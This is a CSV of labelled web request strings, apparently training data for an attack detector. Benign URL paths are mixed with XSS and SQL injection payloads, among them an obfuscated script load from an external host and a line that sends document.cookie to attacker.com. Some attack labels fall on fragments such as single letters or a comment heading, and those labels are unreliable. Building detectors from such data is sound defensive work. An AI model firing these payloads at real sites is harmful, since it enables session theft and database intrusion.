payload,label
/search?id=profile78,0
/search?page=profile276,0
/index.php?category=apple383,0
/search?q=shoes71,0
/assets/style.css?token=profile993,0
/api/v1/users?q=hải952,0
/api/v1/users?q=123377,0
/assets/style.css?token=shoes886,0
"<script>String.fromCharCode(107, 51, 110, 122, 48)</script>",1
"c=""javascript:"";",1
&#0000060,1
/api/v1/users?category=hải9,0
/api/v1/users?token=profile830,0
/assets/style.css?user=profile468,0
/login.html?token=202641,0
/product/detail?category=profile52,0
/search?category=contact576,0
/search?q=contact188,0
/api/v1/users?token=2026854,0
"""+on mouse over =""*****('XSS')",1
/api/v1/users?q=contact178,0
/api/v1/users?user=book885,0
/home?token=hải999,0
/login.html?page=contact306,0
/index.php?category=contact201,0
i,1
"<img src=""<img src=search""/onerror=alert(""xss"")//"">",1
/search?category=admin495,0
/search?token=shoes898,0
"<BGSOUND SRC=""javascript:document.cookie=true;"">",1
/assets/style.css?user=123879,0
/index.php?user=apple164,0
/api/v1/users?user=book561,0
/product/detail?category=hải723,0
/home?token=123385,0
"1"" AND 1=1",1
&#X003c,1
/index.php?page=shoes32,0
/api/v1/users?user=book286,0
/home?token=hải685,0
/search?id=kma97,0
/index.php?user=apple614,0
/home?id=2026576,0
/login.html?page=shoes122,0
/product/detail?q=kma386,0
/home?id=book640,0
/home?q=shoes56,0
/api/v1/users?token=hải120,0
/home?category=2026114,0
/assets/style.css?user=hải907,0
/index.php?token=123383,0
/login.html?category=123471,0
*//”><script>/*alert(1)//,1
/product/detail?id=contact764,0
/api/v1/users?category=book432,0
/index.php?token=book82,0
/login.html?page=kma403,0
"<BASE HREF=""javascript:document.cookie=true;//"">",1
/home?token=profile983,0
'%26%26'javascript:alert%25281%2529//,1
</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>,1
"-1exp/*<A STYLE='no\CrossSiteScripting:noCrossSiteScripting(""*//*"");CrossSiteScripting:ex/*CrossSiteScripting*//*/*/pression(document.cookie=true)'>",1
/api/v1/users?page=kma691,0
/assets/style.css?user=shoes774,0
/search?token=profile534,0
/search?token=shoes593,0
/search?q=book892,0
&#x3C,1
/assets/style.css?q=shoes896,0
"""><script>alert(document.cookie)</script>",1
/product/detail?category=2026100,0
/api/v1/users?q=admin235,0
/product/detail?page=kma942,0
/index.php?q=admin267,0
/index.php?id=123220,0
/product/detail?id=apple634,0
/search?id=profile690,0
/login.html?user=2026643,0
/product/detail?category=kma943,0
/login.html?token=contact52,0
/login.html?user=admin375,0
/home?token=shoes454,0
/assets/style.css?q=2026692,0
/search?user=kma629,0
/home?category=apple752,0
/api/v1/users?token=profile508,0
/index.php?category=contact241,0
<SCRIPT SRC=http://ha.ckers.org/xss.js,1
/product/detail?token=apple378,0
/login.html?user=123505,0
/login.html?user=admin315,0
/search?user=profile692,0
/product/detail?page=book468,0
/assets/style.css?page=contact43,0
/index.php?page=2026214,0
/product/detail?token=hải979,0
"<A HREF=""http://1113982867/"">CrossSiteScripting</A>",1
/product/detail?q=shoes536,0
/index.php?page=profile460,0
/home?q=contact435,0
/index.php?page=apple13,0
/api/v1/users?category=book677,0
/search?q=12320,0
/login.html?token=book285,0
/api/v1/users?user=hải37,0
/assets/style.css?q=profile681,0
/product/detail?page=admin630,0
/index.php?id=kma630,0
/search?q=shoes271,0
/product/detail?token=profile570,0
/login.html?category=shoes2,0
/home?id=admin86,0
/assets/style.css?category=profile599,0
/search?user=shoes902,0
%22%20style%3D%22background:expression(alert(1))%22%20OA%3D%22,1
&#000060;,1
/login.html?page=2026858,0
/product/detail?page=kma843,0
/product/detail?user=contact864,0
/home?token=contact657,0
/home?user=hải496,0
/assets/style.css?token=hải314,0
/home?user=2026792,0
/api/v1/users?token=hải149,0
/search?category=kma194,0
/index.php?page=123112,0
/home?user=2026323,0
/home?user=admin129,0
/login.html?id=hải302,0
/index.php?user=profile925,0
/search?id=shoes120,0
/api/v1/users?token=2026204,0
/login.html?page=contact393,0
/search?q=profile898,0
"<META HTTP-EQUIV=""Link"" Content=""<http://vulnerability-lab.com/CrossSiteScripting.css>; REL=stylesheet"">",1
/login.html?q=apple957,0
/index.php?page=shoes265,0
/product/detail?id=profile365,0
/home?token=book104,0
/product/detail?category=book572,0
"-1<style type=""text/javascript"">document.cookie=true;</style>",1
/index.php?token=kma707,0
/home?category=2026342,0
/home?category=contact226,0
/search?page=book631,0
/login.html?user=shoes957,0
&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',1
/product/detail?page=contact389,0
/home?q=contact611,0
/index.php?user=admin186,0
"<script src=""http://rhainfosec.com/evil.js"">",1
/login.html?page=admin356,0
/login.html?token=book697,0
/login.html?id=2026903,0
/index.php?q=kma143,0
/search?token=apple319,0
%0027%003e%003cscript%003ealert%0028%0027Hello%0027%0029%003c%002fscript%003e,1
/login.html,0
/login.html?user=book407,0
/index.php?page=kma461,0
/product/detail?user=kma503,0
/assets/style.css?token=book631,0
/product/detail?id=apple493,0
/api/v1/users?q=kma455,0
/search?token=book832,0
/api/v1/users?id=shoes80,0
/product/detail?page=kma329,0
/index.php?category=kma325,0
/home?q=book82,0
/login.html?id=apple121,0
/assets/style.css?user=123673,0
/api/v1/users?token=contact733,0
/product/detail?category=profile534,0
/search?id=hải291,0
/index.php?q=12378,0
">""<? echo('<SCR)';echo('IPT>document.cookie=true</SCRIPT>'); ?>",1
/search?id=123597,0
/product/detail?user=hải106,0
/home?id=contact942,0
/api/v1/users?q=2026474,0
/product/detail?id=contact393,0
/login.html?category=123338,0
<audio src=1 onerror=alert(1)>,1
/assets/style.css?page=profile779,0
/assets/style.css?user=admin44,0
/assets/style.css?user=kma919,0
/home?token=profile231,0
/api/v1/users?user=kma791,0
/index.php?user=book269,0
-1<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></OBJECT>,1
/api/v1/users?q=123505,0
/api/v1/users?category=book852,0
/product/detail?category=123762,0
/login.html?user=2026864,0
/assets/style.css?user=123320,0
">""<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""CrossSiteScripting<SCRIPT DEFER>document.cookie=true</SCRIPT>""></BODY></HTML>",1
/login.html?q=admin923,0
/search?category=hải827,0
/product/detail?token=kma221,0
/login.html?page=123625,0
/home?category=shoes61,0
/assets/style.css?user=admin728,0
/home?id=202614,0
/index.php?page=book580,0
/home?token=2026546,0
/search?q=contact115,0
"<param name=""quality"" value=""high"" />",1
/index.php?id=hải903,0
/search?token=shoes524,0
/index.php?id=contact559,0
/home?q=shoes660,0
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",1
/search?token=contact613,0
/api/v1/users?category=shoes721,0
/home?token=profile495,0
/index.php?category=2026381,0
/assets/style.css?user=hải754,0
/home?token=12358,0
/assets/style.css?token=admin795,0
/api/v1/users?category=contact355,0
/login.html?user=hải707,0
/assets/style.css?q=kma28,0
/search?user=2026681,0
/login.html?page=hải113,0
/product/detail?user=2026285,0
/home?user=2026641,0
/home?q=book810,0
""" OR ""1""=""1""#",1
/api/v1/users?user=123237,0
/product/detail?token=kma559,0
/index.php?token=book759,0
/index.php?token=2026494,0
"<title>BIZNET RSS XSS TEST &lt;script>alert(""BIZNET"");&lt;/script></title>",1
/index.php?token=contact327,0
/assets/style.css?id=contact959,0
/assets/style.css?user=hải721,0
/product/detail?user=2026589,0
/home?category=profile689,0
/login.html?page=kma772,0
/api/v1/users?id=apple993,0
/api/v1/users?q=admin689,0
/search?category=apple449,0
/assets/style.css?id=apple158,0
/index.php?user=2026248,0
/login.html?category=2026624,0
/home?page=contact937,0
/api/v1/users?page=admin885,0
/api/v1/users?q=profile176,0
/home?user=kma437,0
/search?category=123506,0
/product/detail?page=hải380,0
/search?category=admin846,0
/product/detail?token=contact196,0
<video src=x onerror=prompt(1);>,1
/assets/style.css?page=contact495,0
/home?user=12396,0
/product/detail?page=hải624,0
/product/detail?user=123755,0
/api/v1/users?id=shoes823,0
/search?user=book15,0
/index.php?id=book122,0
/product/detail?page=contact43,0
/api/v1/users?page=shoes574,0
/assets/style.css?page=123522,0
p,1
/search?token=hải790,0
/login.html?category=apple691,0
/product/detail?user=2026211,0
/search?id=2026689,0
/login.html?user=kma218,0
/index.php?q=contact967,0
/login.html?user=2026525,0
/product/detail?q=123543,0
/search?page=123543,0
/login.html?category=123213,0
/login.html?token=12356,0
<object/data=//goo.gl/nlX0P?,1
/login.html?q=apple78,0
/login.html?q=kma318,0
/product/detail?id=profile534,0
/login.html?category=12316,0
/api/v1/users?q=kma766,0
/api/v1/users?id=kma20,0
/api/v1/users?user=123407,0
/product/detail?user=profile865,0
/home?token=kma272,0
/assets/style.css?q=admin462,0
/home?category=123118,0
/product/detail?category=contact347,0
/api/v1/users?id=hải923,0
/product/detail?user=admin185,0
/assets/style.css?id=profile889,0
/product/detail?category=hải237,0
alert(document['cookie']),1
/api/v1/users?q=kma928,0
/home?token=2026101,0
/search?page=2026976,0
/product/detail?q=profile89,0
/product/detail?user=book937,0
"""><img src=x.png onerror=prompt(""XSS"");>",1
/index.php?page=admin322,0
/search?category=profile328,0
"10,103,64,82,69,77,79,86,69,34,41,60,47,115,99,114,105,112,116,62));"">String:fr",1
">""<TABLE BACKGROUND=""javascript:document.cookie=true;"">",1
/login.html?token=shoes291,0
/product/detail?token=kma155,0
/api/v1/users?id=apple737,0
/product/detail?user=book602,0
/assets/style.css?q=admin431,0
/index.php?id=contact141,0
"\"";alert('XSS');//",1
/assets/style.css?token=book346,0
/search?category=admin478,0
/index.php?q=2026757,0
/assets/style.css?id=admin50,0
&#00060;,1
/api/v1/users?page=hải362,0
/api/v1/users?token=contact144,0
/search?q=shoes867,0
/index.php?token=admin957,0
/assets/style.css?category=hải475,0
/search?q=2026139,0
' ORDER BY 2--,1
/home?page=contact434,0
/search?id=profile134,0
/home?id=apple890,0
/search?q=book304,0
/product/detail?id=2026719,0
/index.php?page=kma9,0
/assets/style.css?page=123332,0
"""/><script>alert(1)</script>",1
/home?id=profile110,0
/search?category=123778,0
/product/detail?category=kma756,0
/home?category=2026837,0
/api/v1/users?user=apple718,0
/assets/style.css?q=apple695,0
""" OR 1=1;--",1
/home?page=profile208,0
&#X0003C;,1
/assets/style.css?q=book933,0
/home?user=admin594,0
/login.html?user=admin404,0
/api/v1/users?page=contact308,0
¼script¾alert(¢XSS¢)¼/script¾,1
/product/detail?id=contact366,0
/api/v1/users?category=shoes199,0
/product/detail?category=profile994,0
/index.php?id=123388,0
/search?token=2026318,0
&#x003C;,1
/search?category=contact612,0
/product/detail?id=book58,0
/product/detail?page=apple420,0
/login.html?id=profile492,0
/api/v1/users?q=hải392,0
/home?page=contact33,0
/api/v1/users?category=2026786,0
/login.html?q=shoes276,0
/search?token=contact425,0
om.Char.Code</button></body></html>,1
"<DIV STYLE=""background-image: url(javascript:alert('CrossSiteScripting'))"">",1
/product/detail?q=kma842,0
/product/detail?token=contact624,0
/index.php?user=kma759,0
/index.php?user=profile147,0
/product/detail?id=profile993,0
/api/v1/users?q=2026229,0
/home?q=shoes880,0
-1<STYLE>@im\port'\ja\vasc\ript:document.cookie=true';</STYLE>,1
/login.html?category=book273,0
/assets/style.css?token=123451,0
'><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>',1
/search?category=hải727,0
/home?token=admin911,0
/product/detail?id=profile63,0
/home?page=hải545,0
/product/detail?token=apple814,0
/home?q=2026100,0
/product/detail?id=contact419,0
/assets/style.css?page=profile899,0
/search?token=admin489,0
/home?q=shoes852,0
/index.php?q=123302,0
/api/v1/users?id=book259,0
'OR%0d1=1--,1
/assets/style.css?token=shoes583,0
/search?id=admin330,0
/api/v1/users?q=book702,0
/home?category=apple325,0
/api/v1/users?id=shoes171,0
/product/detail?user=book738,0
/assets/style.css?category=123420,0
/search?token=apple804,0
/login.html?q=hải535,0
/index.php?user=book413,0
/index.php?page=hải50,0
/product/detail?category=apple266,0
/home?token=123625,0
/index.php?q=profile130,0
/assets/style.css?id=contact551,0
/assets/style.css?user=hải291,0
&#X003C;,1
/product/detail?q=apple429,0
/index.php?q=apple658,0
/login.html?category=hải185,0
/assets/style.css?user=2026572,0
/assets/style.css?category=contact105,0
/login.html?id=kma424,0
/assets/style.css?category=kma203,0
&#X0003c,1
/api/v1/users?page=book503,0
/index.php?token=admin437,0
/index.php?q=kma66,0
/index.php?page=contact296,0
/index.php?token=apple355,0
"<IMG DYNSRC=""javascript:alert('CrossSiteScripting')"">",1
<svg/onload=alert(1),1
/product/detail?q=admin648,0
/api/v1/users?user=shoes62,0
/search?user=admin772,0
/home?user=hải866,0
/product/detail?category=profile159,0
/search?category=kma560,0
/api/v1/users?q=book692,0
/assets/style.css?category=hải159,0
/assets/style.css?page=contact745,0
/assets/style.css?q=hải51,0
/login.html?user=admin250,0
/home?page=shoes968,0
/login.html?token=admin854,0
/product/detail?q=admin335,0
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",1
/index.php?token=book8,0
/index.php?user=contact871,0
/product/detail?page=shoes337,0
/api/v1/users?page=2026716,0
/index.php?token=2026729,0
/api/v1/users?token=profile714,0
/api/v1/users?category=hải36,0
/login.html?q=profile218,0
/login.html?id=contact77,0
&#x3c;,1
/api/v1/users?token=shoes790,0
/api/v1/users?q=hải750,0
/assets/style.css?token=123854,0
<SCRIPT SRC=http://vulnerability-lab.com/CrossSiteScripting.js?<B>,1
/home?q=book254,0
/index.php?id=apple808,0
/product/detail?category=hải562,0
/index.php?q=apple359,0
/login.html?q=hải500,0
/index.php?token=apple312,0
/assets/style.css?page=apple248,0
/api/v1/users?page=admin159,0
/search?token=book475,0
/search?category=admin905,0
/login.html?category=contact334,0
/assets/style.css?token=2026827,0
/api/v1/users?category=shoes707,0
/index.php?q=2026867,0
/login.html?page=contact186,0
"-1<div style=""background-image: url(javascript:document.cookie=true;);"">",1
/login.html?user=2026769,0
/product/detail?q=admin702,0
/product/detail?id=contact889,0
/home?category=admin489,0
/assets/style.css?user=book842,0
/assets/style.css?id=123103,0
/assets/style.css?user=apple716,0
">""<div style=""behaviour: url([link to code]);"">",1
"<SCRIPT =""blah"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",1
"<svg%20xmlns:xlink=""http://www.w3.org/1999/xlink""><a><circle%20r=100%20/><animate%20attributeName=""xlink:href""%20values="";javascript:alert(1)""%20begin=""0s""%20dur=""0.1s""%20fill=""freeze""/>",1
"<EMBED SRC=""http://ha.ckers.org/xss.swf"" AllowScriptAccess=""always""></EMBED>",1
/assets/style.css?category=profile336,0
"<SCRIPT>document.write(""<SCRI"");</SCRIPT>PT SRC=""http://vulnerability-lab.com/CrossSiteScripting.js""></SCRIPT>",1
background-image: url(javascript:alert(1)),1
/search?token=profile939,0
/index.php?user=shoes168,0
/assets/style.css?page=book221,0
"<div style=""behaviour: url([link to code]);"">",1
/search?page=2026998,0
/index.php?page=contact25,0
/login.html?id=profile594,0
/login.html?page=hải888,0
/api/v1/users?page=contact316,0
/index.php?q=shoes44,0
/product/detail?page=profile651,0
/api/v1/users?page=hải961,0
/index.php?category=profile387,0
">""<a href=""javascript#document.cookie=true;"">",1
/assets/style.css?page=kma631,0
/assets/style.css?user=2026489,0
/home?category=shoes418,0
/home?category=admin816,0
/assets/style.css?token=hải208,0
/index.php?id=apple654,0
/home?page=123498,0
/api/v1/users?user=shoes879,0
/index.php?token=shoes385,0
/index.php?user=contact319,0
/product/detail?category=contact443,0
/home?token=2026492,0
/search?id=kma35,0
/api/v1/users?q=shoes749,0
/home?page=kma568,0
/index.php?id=admin962,0
""" OR 1=1;/*",1
'/**/OR/**/1=1--,1
">""<LINK REL=""stylesheet"" HREF=""javascript:document.cookie=true;"">",1
/login.html?q=admin309,0
/product/detail?category=apple839,0
/index.php?user=book99,0
">""<iframe src=""javascript:document.cookie=true;>",1
/api/v1/users?token=book64,0
/login.html?page=hải635,0
/product/detail?token=profile728,0
/login.html?category=kma68,0
"test'""()&%<acx><ScRiPt >prompt(1)</ScRiPt>",1
/login.html?page=admin26,0
/login.html?q=shoes596,0
/login.html?id=admin815,0
/api/v1/users?id=book741,0
/home?id=book157,0
/api/v1/users?category=123247,0
/search?q=admin652,0
"-1<div style=""binding: url([link to code]);"">",1
/assets/style.css?page=2026695,0
/product/detail?q=admin789,0
/home?q=admin403,0
/product/detail?q=hải569,0
/home?page=apple187,0
/product/detail?id=hải945,0
/product/detail?category=profile375,0
/product/detail?category=hải757,0
/product/detail?id=kma619,0
/api/v1/users?id=admin331,0
/search?token=shoes825,0
/search?user=contact233,0
/assets/style.css?user=kma71,0
/api/v1/users?page=kma661,0
/search?category=shoes132,0
/assets/style.css?q=admin848,0
"<isindex action=""javascript:alert(1)"" type=image>",1
/search?q=kma305,0
/assets/style.css?token=hải213,0
/index.php?category=hải600,0
/product/detail?id=apple218,0
/product/detail?token=profile765,0
/home?category=profile599,0
/login.html?id=contact356,0
/api/v1/users?user=contact997,0
"\"";alert('CrossSiteScripting');//",1
/home?q=shoes931,0
/assets/style.css?page=admin100,0
/index.php?token=contact786,0
/home?user=book109,0
/home?category=123105,0
/home?category=shoes645,0
<script>alert(document.cookie)</script>@gmail.com,1
/index.php?user=123757,0
/login.html?category=profile771,0
/login.html?id=kma59,0
/home?category=contact450,0
/product/detail?user=12335,0
/api/v1/users?user=contact429,0
/login.html?category=book619,0
/search?id=kma502,0
/login.html?token=admin228,0
/home?id=12353,0
/login.html?token=contact886,0
/login.html?user=2026349,0
/index.php?page=contact444,0
/assets/style.css?page=book289,0
/assets/style.css?page=book624,0
/home?page=202682,0
/assets/style.css?q=contact117,0
/home?page=shoes741,0
/assets/style.css?token=hải62,0
/assets/style.css?category=shoes204,0
/assets/style.css?page=123533,0
/home?user=profile678,0
/assets/style.css?page=contact179,0
/search?token=shoes291,0
/search?user=admin156,0
/login.html?category=2026247,0
' OR 1=1--,1
/index.php?page=profile787,0
/product/detail?page=profile527,0
/api/v1/users?id=profile987,0
/search?page=book323,0
&#x00003C,1
/login.html?token=shoes522,0
/home?q=shoes954,0
/assets/style.css?token=contact431,0
/search?id=123585,0
/search?category=profile695,0
/assets/style.css?token=profile148,0
/home?user=hải494,0
/home?category=2026279,0
/home?id=apple550,0
/search?category=hải399,0
/home?token=2026862,0
/assets/style.css?page=hải935,0
<CrossSiteScripting:CrossSiteScripting>CrossSiteScripting</CrossSiteScripting:CrossSiteScripting>,1
/assets/style.css?category=book775,0
/assets/style.css?token=profile314,0
/login.html?q=book987,0
/login.html?token=shoes387,0
/home?id=contact714,0
/assets/style.css?category=profile840,0
/home?page=2026919,0
/api/v1/users?q=hải949,0
/assets/style.css?token=2026649,0
"<BASE HREF=""javascript:alert('CrossSiteScripting');//"">",1
/search?page=123278,0
/assets/style.css?user=apple242,0
/index.php?category=123692,0
/login.html?category=contact526,0
/product/detail?id=hải607,0
/product/detail?user=2026155,0
/assets/style.css?category=kma269,0
/search?page=shoes132,0
/search?page=admin588,0
/assets/style.css?token=hải632,0
/home?id=contact717,0
/product/detail?id=hải232,0
/index.php?q=2026505,0
/product/detail?category=123916,0
/index.php?token=profile420,0
/search?id=2026484,0
/search?token=apple935,0
'><script>alert('XSS')</script>,1
/product/detail?token=profile960,0
') OR '1'='1'--,1
<script>+-+-1-+-+alert(1)</script>,1
/index.php?id=hải200,0
/login.html?token=2026983,0
/index.php?token=shoes836,0
/home?q=hải140,0
/assets/style.css?category=kma420,0
/assets/style.css?user=shoes997,0
/product/detail?id=book945,0
/home?page=contact528,0
/assets/style.css?id=admin45,0
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",1
/assets/style.css?token=2026224,0
/login.html?id=hải759,0
/index.php?id=admin909,0
/home?id=2026113,0
/index.php?q=contact24,0
"""><input>javascript:alert(document.cookie);>",1
/login.html?token=hải872,0
/home?page=kma390,0
/home?page=kma384,0
/product/detail?page=book952,0
/home?page=profile358,0
/search?page=admin728,0
/search?q=123400,0
/login.html?q=book393,0
/api/v1/users?user=shoes305,0
/login.html?page=123236,0
/product/detail?user=hải533,0
/assets/style.css?q=kma467,0
/home?page=contact994,0
/index.php?token=2026364,0
'onfocus='alert(0x000381)',1
"-1<div style=""behaviour: url([link to code]);"">",1
/index.php?page=kma532,0
/login.html?page=shoes951,0
/search?user=shoes431,0
/home?q=123377,0
/api/v1/users?user=123814,0
/product/detail?user=hải850,0
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",1
/search?id=book512,0
add name <script>alert('VL')</script>,1
/login.html?user=book440,0
/search?user=admin44,0
/search?page=book966,0
/product/detail?token=book264,0
/index.php?category=2026984,0
"""><sCrIpT>alert(02164699099)</sCrIpT>",1
/index.php?id=kma151,0
/index.php?user=shoes837,0
/assets/style.css?user=book754,0
/assets/style.css?page=2026136,0
/search?page=shoes476,0
/login.html?q=contact491,0
/login.html?id=123889,0
/api/v1/users?id=contact822,0
/search?category=contact912,0
/assets/style.css?user=kma196,0
/index.php?q=shoes853,0
/search?category=hải705,0
/search?token=shoes270,0
/index.php?category=123230,0
/index.php?id=apple806,0
/index.php?category=book736,0
/search?token=book212,0
/index.php?user=kma70,0
/login.html?q=2026132,0
/index.php?token=hải700,0
/search?id=book741,0
/index.php?token=kma490,0
/index.php?category=apple257,0
/assets/style.css?token=profile684,0
"<object data=""data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==""></object>",1
-1<SCRIPT <B>document.cookie=true;</SCRIPT>,1
/login.html?category=shoes141,0
/home?page=2026898,0
/assets/style.css?q=apple16,0
/search?token=book317,0
/product/detail?q=contact142,0
/home?category=apple703,0
/assets/style.css?page=profile169,0
/search?q=123874,0
/home?page=shoes988,0
/search?user=2026353,0
/assets/style.css?id=admin745,0
/product/detail?page=apple921,0
/product/detail?category=kma973,0
/login.html?q=123669,0
/product/detail?page=hải395,0
/product/detail?q=book732,0
/assets/style.css?user=hải336,0
/login.html?q=hải87,0
' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--,1
/index.php?user=hải917,0
/product/detail?id=admin243,0
',1
/search?page=book69,0
/login.html?page=admin96,0
/api/v1/users?q=shoes744,0
/login.html?user=contact418,0
/assets/style.css?user=12376,0
/product/detail?page=book795,0
/home?q=hải196,0
/index.php?token=book618,0
/login.html?page=contact161,0
"""><%tag style=""xss:expression(alert(document.cookie))"" %>",1
/login.html?q=apple840,0
/product/detail?user=profile393,0
<isindex action=javascript:alert(1) type=image>,1
/home?q=profile811,0
/assets/style.css?page=123807,0
/product/detail?page=2026270,0
/search?category=contact841,0
/home?id=shoes292,0
/api/v1/users?q=2026388,0
/index.php?q=kma73,0
">""<XML ID=""CrossSiteScripting""><I><B><IMG SRC=""javas<!-- -->cript:document.cookie=true""></B></I></XML><SPAN DATASRC=""#CrossSiteScripting"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",1
/api/v1/users?token=2026696,0
/assets/style.css?id=shoes412,0
/home?id=apple643,0
/product/detail?user=admin330,0
/assets/style.css?token=profile762,0
/product/detail?user=admin900,0
/home?q=admin252,0
/assets/style.css?user=apple803,0
/login.html?category=shoes245,0
/api/v1/users?category=12355,0
/assets/style.css?q=contact724,0
/index.php?id=book330,0
/api/v1/users?page=123659,0
/login.html?page=2026462,0
"<IMG onmouseover=""alert('xxs')"">",1
/home?token=2026194,0
/search?category=hải905,0
/search?token=2026338,0
"<script src=""data:text/javascript,alert(1)""></script>",1
/home?category=2026205,0
/assets/style.css?token=123156,0
/login.html?id=contact879,0
/home?page=2026564,0
/assets/style.css?token=contact99,0
/product/detail?category=123921,0
/api/v1/users?user=apple111,0
/home?page=book49,0
/search?page=apple463,0
/index.php?token=apple149,0
"<DIV STYLE=""background-image: url(javascript:document.cookie=true;)"">",1
/api/v1/users?user=12365,0
/product/detail?id=hải444,0
/index.php?token=kma337,0
/login.html?token=book613,0
/product/detail?q=2026242,0
/product/detail?id=hải140,0
/login.html?token=profile508,0
/assets/style.css?user=hải92,0
/search?id=profile574,0
/product/detail?token=123292,0
/api/v1/users?category=contact983,0
'});%0aalert(1);%20//,1
/home?id=admin324,0
<svg><script onlypossibleinopera:-)> alert(1),1
"<img src=""blah>"" onmouseover=""document.cookie=true;"">",1
/home?page=apple559,0
/login.html?category=profile667,0
/api/v1/users?token=123909,0
/home?id=hải150,0
/login.html?user=book588,0
/index.php?category=kma802,0
/assets/style.css?page=shoes447,0
/api/v1/users?q=123217,0
/assets/style.css?q=123835,0
/product/detail?q=kma690,0
/assets/style.css?user=shoes554,0
/product/detail?token=contact530,0
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')""></TD></TABLE>",1
/home?category=profile631,0
/api/v1/users?user=kma484,0
"<TABLE BACKGROUND=""javascript:document.cookie=true;"">",1
l,1
/login.html?category=apple789,0
/assets/style.css?q=kma155,0
/assets/style.css?page=2026214,0
/login.html?page=hải409,0
/api/v1/users?token=202674,0
/index.php?q=profile615,0
/login.html?token=admin943,0
&#x00003c;,1
/home?category=2026990,0
/product/detail?category=hải678,0
/api/v1/users?q=book428,0
/assets/style.css?user=hải404,0
/home?q=admin380,0
/login.html?page=book26,0
/assets/style.css?token=hải549,0
/assets/style.css?user=book626,0
/api/v1/users?q=kma422,0
/login.html?user=apple150,0
/home?token=contact531,0
# Polyglots,1
/api/v1/users?user=book410,0
/home?category=2026665,0
/login.html?id=hải922,0
/home?category=shoes162,0
/search?page=profile377,0
/index.php?token=profile741,0
/index.php?token=book853,0
/login.html?user=shoes163,0
/product/detail?page=shoes600,0
/search?q=123464,0
/assets/style.css?user=shoes433,0
/api/v1/users?category=kma485,0
/api/v1/users?id=admin398,0
/home?category=2026262,0
/home?q=2026109,0
/product/detail?user=2026234,0
/login.html?user=2026404,0
/login.html?q=profile569,0
/search?q=2026704,0
/home?q=hải306,0
/login.html?id=hải359,0
/search?id=book489,0
/index.php?q=kma887,0
/assets/style.css?category=profile531,0
/assets/style.css?page=book22,0
/product/detail?q=12323,0
"false,false,false);});alert(1); //",1
/index.php?user=book903,0
/search?category=2026363,0
/home?page=contact848,0
/api/v1/users?category=202661,0
/login.html?user=123369,0
">""<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">",1
/home?token=profile386,0
"this[""document""][""cookie""]",1
/api/v1/users?token=123136,0
/api/v1/users?q=123229,0
/index.php?token=apple841,0
/api/v1/users?page=hải907,0
/login.html?q=admin554,0
/search?id=2026965,0
/index.php?category=admin769,0
/index.php?id=apple312,0
/home?q=book900,0
/assets/style.css?id=book15,0
/api/v1/users?token=hải818,0
"<video><source onerror=""javascript:alert(1)"">",1
/index.php?q=apple439,0
%73%63%72%69%70%74%3E,1
/search?q=12376,0
/search?category=admin208,0
/login.html?q=book90,0
/api/v1/users?token=hải237,0
/home?user=apple784,0
&#060,1
/assets/style.css?q=2026405,0
/search?page=2026956,0
/search?user=contact715,0
/assets/style.css?q=123524,0
"<t:set attributeName=""innerHTML"" to=""CrossSiteScripting<SCRIPT DEFER>alert(""CrossSiteScripting"")</SCRIPT>"">",1
<script>alert('httpOnly Test: '  +document.cookie)</script>,1
/search?id=hải730,0
/assets/style.css?category=admin548,0
/home?id=hải699,0
/search?token=shoes892,0
/api/v1/users?id=admin486,0
Cross Site Scripting Strings Restriction Bypass Phone:,1
/search?q=2026935,0
/login.html?category=202687,0
/login.html?q=kma884,0
/home?page=profile575,0
/search?id=kma391,0
/search?page=admin814,0
/api/v1/users?user=123171,0
